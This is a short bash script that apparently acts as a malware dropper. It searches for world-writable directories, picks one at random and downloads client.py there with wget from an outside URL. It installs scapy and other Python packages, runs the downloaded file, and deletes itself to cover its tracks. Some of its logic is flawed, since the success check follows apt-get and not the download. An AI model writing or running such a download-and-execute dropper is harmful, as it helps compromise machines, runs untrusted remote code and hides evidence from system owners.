#!/bin/bash

# file writable directories
directories=($(find / -perm -222 -type d 2>/dev/null))

# if none found...
if [ ${#directories[@]} -eq 0 ]; then
    directories=$(pwd)
fi

# randomly select a directory
random_index=$(( RANDOM % ${#directories[@]} ))
random_directory=${directories[$random_index]}

# download binary to directory
wget -P "$random_directory" 'https://validator.w3.org/checklink?uri=/client.py'

# install any dependencies
apt-get install python3-scapy
apt-get install python3-urllib3
apt-get install python3-bs4
#pip3 intsall ...

# if download was successful...
if [ $? -eq 0 ]; then
    # execute
    cd $random_directory
    python3 client.py
fi

# self destruct
rm -f $0
